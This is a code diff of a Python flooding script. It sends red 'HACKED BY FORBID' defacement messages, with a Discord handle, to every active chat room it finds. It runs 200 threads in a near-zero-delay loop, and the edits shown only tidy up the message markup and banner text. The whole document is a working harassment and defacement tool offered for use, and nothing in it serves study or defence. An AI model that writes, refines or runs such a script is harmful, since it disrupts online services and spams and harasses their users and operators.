@@ -8,17 +8,17 @@ headers = {
     "Content-Type": "application/json"
 }
 
-print("[FORBID] Ultimate Nuclear Broadcaster Fully Engaged...")
+print("[FORBID] Clean-Render Broadcaster Initialized...")
 
 session = requests.Session()
 
 def blast_room(room_url):
     try:
-        # Massive RichText formatting for oversized, prominent alerts
+        # Cleaned up RichText syntax to prevent raw code glitches while keeping it massive and bold
         payload = {
-            "Sender": "<b><font size='28' color='#FF0000'>FORBID</font></b>",
-            "Message": "<b><font size='24' color='#FF0000'>HACKED BY FORBID | DISCORD: forbiddenway</font></b>",
-            "Text": "<b><font size='24' color='#FF0000'>HACKED BY FORBID | DISCORD: forbiddenway</font></b>",
+            "Sender": '<font color="#FF0000"><b>FORBID</b></font>',
+            "Message": '<font color="#FF0000"><b>HACKED BY FORBID | DISCORD: forbiddenway</b></font>',
+            "Text": '<font color="#FF0000"><b>HACKED BY FORBID | DISCORD: forbiddenway</b></font>',
             "Timestamp": int(time.time() * 1000),
             "Aura": "voidWings",
             "Color": "red"
@@ -41,13 +41,11 @@ while True:
                 ]
                 
                 if room_urls:
-                    # Maximum parallel threads to hit every server simultaneously
                     with ThreadPoolExecutor(max_workers=200) as executor:
                         executor.map(blast_room, room_urls)
-                    print(f"[FORBID] Mega-blast wave delivered to {len(room_urls)} active servers!")
+                    print(f"[FORBID] Clean blast wave delivered to {len(room_urls)} active servers!")
                     
     except Exception as e:
         print(f"[FORBID] Loop error: {e}")
         
-    # Zero delay for continuous full-throttle flooding
     time.sleep(0.01)
